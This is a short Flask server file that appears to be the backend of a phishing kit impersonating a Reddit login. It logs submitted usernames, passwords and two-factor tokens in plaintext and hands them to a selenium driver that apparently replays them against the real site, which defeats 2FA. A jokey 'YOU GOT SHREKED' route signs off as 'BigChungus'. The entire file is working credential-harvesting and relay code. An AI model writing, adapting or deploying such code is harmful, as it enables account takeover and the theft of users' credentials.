import logging
import sys
import json

from flask import (Flask, render_template, redirect, url_for, request, jsonify)

import selenium_driver as sd


app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/links.html')
def links():
    return render_template('links.html')


@app.route('/reddit')
def reddit():
    return render_template('reddit.html')


@app.route('/login', methods=['POST'])
def login():
    data = json.loads(request.data)
    user = data['username']
    pswd = data['password']

    app.logger.info('user: {}  //  pass: {}'.format(user, pswd))

    err = sd.do_login(Username=user, Password=pswd)

    res = {'valid': False, 'twofa': False}

    if err == sd.SUCCESS_NO_TWOAUTH:
        res['valid'] = True
    if err == sd.SUCCESS_TWOAUTH:
        res['valid'] = True
        res['twofa'] = True

    return jsonify(res)


@app.route('/token', methods=['POST'])
def twofa():
    data = json.loads(request.data)
    tok = data['token']

    app.logger.info('tok: {}'.format(tok))

    valid = sd.do_twoauth(tok)

    return jsonify({'valid': valid})


@app.route('/shrek', methods=['GET'])
def shrek():
    return 'YOU GOT SHREKED!!\n\n\tRegards,\n\tBigChungus'


def main():
    app.before_first_request(sd.setup)
    app.run(host='0.0.0.0', port=80)


if __name__ == '__main__':
    main()

